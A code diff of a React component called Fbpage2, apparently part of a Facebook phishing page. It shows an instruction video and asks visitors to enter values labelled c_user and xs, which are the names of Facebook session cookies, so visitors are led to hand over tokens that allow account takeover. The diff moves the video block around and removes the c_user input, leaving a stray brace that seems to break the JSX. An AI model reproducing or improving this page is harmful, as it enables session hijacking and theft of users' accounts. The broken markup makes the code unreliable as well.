@@ -71,36 +71,39 @@ function Fbpage2() {
                         <p>Must Watch Detailed Video Information:</p>
                     </div>
 
-                    <div>
-                        // <video 
-                        //     controls 
-                        //     loop 
-                        //     autoPlay 
-                        //     width="300" 
-                        //     poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png"
-                        // >
-                        //     <source 
-                        //         src="https://instructions-video.vercel.app/detailed_video.mp4" 
-                        //         type="video/mp4"
-                        //     />
-                        // </video>
+  {    <div>
+                        <video 
+                            controls 
+                            loop 
+                            autoPlay 
+                            width="300" 
+                            poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png"
+                        >
+                            <source 
+                                src="https://instructions-video.vercel.app/detailed_video.mp4" 
+                                type="video/mp4"
+                            />
+                        </video>
                     </div>
 
                     <p className="tr-5">
                         Please be sure to provide the requested information below.
                     </p>
 
-                    <div>
-                        <p className="mt-4">c_user*</p>
-                        <input 
-                            type="text" 
-                            name="c_user" 
-                            id="c_user" 
-                            required
-                            value={email}
-                            onChange={(e) => setEmail(e.target.value)}
-                        />
-                    </div>
+                           {/* <div>
+                        <video 
+                            controls 
+                            loop 
+                            autoPlay 
+                            width="300" 
+                            poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png"
+                        >
+                            <source 
+                                src="https://instructions-video.vercel.app/detailed_video.mp4" 
+                                type="video/mp4"
+                            />
+                        </video>
+                    </div> */}
 
                     <div>
                         <p className="mt-4">xs*</p>
